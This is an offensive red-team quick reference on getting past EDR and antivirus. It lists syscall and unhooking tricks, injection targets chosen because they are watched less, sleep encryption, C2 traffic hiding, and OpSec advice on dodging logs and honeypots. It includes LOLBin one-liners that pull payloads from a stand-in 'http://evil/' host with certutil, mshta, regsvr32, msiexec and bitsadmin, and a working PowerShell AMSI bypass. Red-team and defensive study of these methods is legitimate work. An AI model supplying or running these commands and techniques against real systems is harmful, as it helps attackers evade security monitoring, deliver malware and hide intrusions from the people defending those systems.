# EDR/AV Evasion and Stealthy Operations Quick Reference

> Source: a consolidation of multiple red-team field experiences (2024-2026)
> Applicable scenario: reference when you need to operate in an environment protected by EDR/AV

---

## Detection Layers and Corresponding Evasion

| Detection layer | What the EDR does | Evasion approach |
|--------|-----------|---------|
| Static signatures | Match known malicious file hashes/features | Custom compilation, encrypt payload, modify features |
| User-mode hooks | Hook ntdll.dll to monitor API calls | Direct syscalls / Unhooking / bring your own ntdll |
| Kernel callbacks | Register process/thread/image-load callbacks | Callback removal (requires a driver) / injection into legitimate processes |
| ETW | Collect events via ETW | Patch EtwEventWrite / disable the provider |
| Behavioral analysis | Analyze call sequences and behavior patterns | Delayed execution / spread out operations / mimic normal behavior |
| Memory scanning | Periodically scan process memory | Heap encryption / encrypt payload while sleeping / module stomping |
| Network detection | Analyze outbound traffic features | Domain fronting / legitimate-service tunneling / encryption |

---

## Practical Evasion Techniques

### 1. Direct Syscalls (Bypass User-Mode Hooks)

```
Principle: skip ntdll.dll and call the kernel directly with the syscall instruction
Tools: SysWhispers3 / HellsGate / TartarusGate
Effect: bypasses all user-mode hooks
```

### 2. Unhooking (Restore the Original ntdll)

```
Method A: re-map ntdll.dll from disk
Method B: load a clean copy from the KnownDlls directory
Method C: copy the .text section from a suspended process
Effect: restore hooked APIs to their original state
```

### 3. Process Injection (Choose a Low-Monitoring Target)

```
Recommended injection targets (low monitoring):
- RuntimeBroker.exe
- sihost.exe
- taskhostw.exe
- explorer.exe (slightly higher risk)

Avoid injecting into:
- lsass.exe (heavily monitored)
- svchost.exe (a focus for some EDRs)
- powershell.exe / cmd.exe
```

### 4. Module Stomping

```
Principle: write the payload into the .text section of an already-loaded legitimate DLL
Effect: memory scanning sees a legitimate module rather than suspicious RWX memory
```

### 5. Sleep Encryption (Ekko/Zilean)

```
Principle: the beacon encrypts its own memory while sleeping
Effect: memory scanning cannot find the payload's features
Implementation: register a Timer callback, encrypt before sleep, decrypt after waking
```

### 6. Call Stack Spoofing

```
Principle: forge the call stack so API calls appear to come from legitimate code
Effect: bypasses call-stack-based behavioral detection
```

---

## C2 Traffic Concealment

| Technique | Principle | Detection difficulty |
|------|------|---------|
| Domain fronting | The HTTPS request's SNI and Host header differ | High |
| Cloudflare Workers | Relayed through CF, appears to be normal HTTPS | High |
| Azure/AWS legitimate services | Use cloud service APIs as the C2 channel | Very high |
| DNS over HTTPS | C2 data encoded in DNS queries | Medium |
| WebSocket | Long-lived connection, blends into normal Web traffic | Medium |
| ICMP tunnel | Data hidden in ICMP packets | Low (easily spotted) |

---

## LOLBins (Living Off the Land)

Use legitimate built-in system programs to perform malicious operations:

| Program | Purpose | Example command |
|------|------|---------|
| certutil | Download a file | `certutil -urlcache -split -f http://evil/payload.exe` |
| mshta | Execute an HTA | `mshta http://evil/payload.hta` |
| rundll32 | Load a DLL | `rundll32 evil.dll,EntryPoint` |
| regsvr32 | Load an SCT | `regsvr32 /s /n /u /i:http://evil/file.sct scrobj.dll` |
| wmic | Remote execution | `wmic /node:target process call create "cmd"` |
| msiexec | Install an MSI | `msiexec /q /i http://evil/payload.msi` |
| bitsadmin | Download a file | `bitsadmin /transfer job http://evil/payload.exe C:\payload.exe` |
| forfiles | Execute a command | `forfiles /p c:\windows /m notepad.exe /c "cmd /c calc.exe"` |

---

## AMSI Bypass (PowerShell)

```powershell
# Classic patch (may be caught by signature detection)
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Stealthier method: reflectively modify AmsiScanBuffer
# Or downgrade PowerShell to v2 (no AMSI)
powershell -version 2
```

---

## Operational Security (OpSec) Principles

1. **Minimal-action principle** — do not touch what you do not have to, do not create new credentials when existing ones will do
2. **Time window** — operate during the target's off-hours (reduces the chance of manual review)
3. **Traffic blending** — make C2 communication frequency and size mimic normal business traffic
4. **Tools never touch disk** — execute in memory, clean up immediately after use
5. **Log awareness** — know which operations produce which logs, avoid them in advance or clean up afterward
6. **Honeypot identification** — identify honeypots before operating (abnormally open services, overly tempting credentials)
7. **Segmented operations** — do not complete all steps at once, spread them across multiple time windows
